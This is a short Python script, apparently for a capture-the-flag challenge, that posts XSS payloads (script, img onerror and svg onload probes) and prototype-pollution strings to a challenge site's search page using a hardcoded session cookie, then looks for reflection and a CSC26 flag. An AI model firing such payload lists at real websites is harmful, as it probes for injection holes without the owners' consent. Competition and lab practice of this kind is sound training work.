import requests
from bs4 import BeautifulSoup
import re

base_url = "https://poiuytrewqas-csc26.cybersecuritychallenge.al"
session = requests.Session()
session.cookies.set('session', 'eyJ1c2VyIjoiYWxwZXRnIn0.aXymyw.GBEYMO9Mn9kpHr1J86YGyGs4CsE')

# XSS payloads
xss_payloads = [
    "<script>alert('XSS')</script>",
    "<img src=x onerror=alert('XSS')>",
    "javascript:alert('XSS')",
    "<svg/onload=alert('XSS')>",
    "'-alert('XSS')-'",
    '"><script>alert(String.fromCharCode(88,83,83))</script>',
]

search_url = f"{base_url}/search"

print("[+] Testing XSS payloads in search...")
for payload in xss_payloads:
    print(f"\n[*] Payload: {payload}")
    response = session.post(search_url, data={"q": payload})
    
    # Check if payload is reflected without encoding
    soup = BeautifulSoup(response.text, 'html.parser')
    if "<script>" in response.text or "onerror=" in response.text or "onload=" in response.text:
        print(f"    [!] Payload might be reflected!")
        print(f"    Response snippet: {response.text[response.text.find(payload)-50:response.text.find(payload)+100]}")
    
    # Look for any different response or errors
    if response.status_code != 200:
        print(f"    Status: {response.status_code}")
    
    if "CSC26{" in response.text:
        print(f"\n🚩 FLAG FOUND!")
        print(re.findall(r'CSC26\{[^}]+\}', response.text))

# Try prototype pollution
print("\n\n[+] Testing prototype pollution payloads...")
pp_payloads = [
    "__proto__[flag]",
    "constructor.prototype.flag",
    "{\"__proto__\": {\"flag\": \"test\"}}",
]

for payload in pp_payloads:
    response = session.post(search_url, data={"q": payload})
    print(f"[*] {payload}: {response.text[:100]}...")
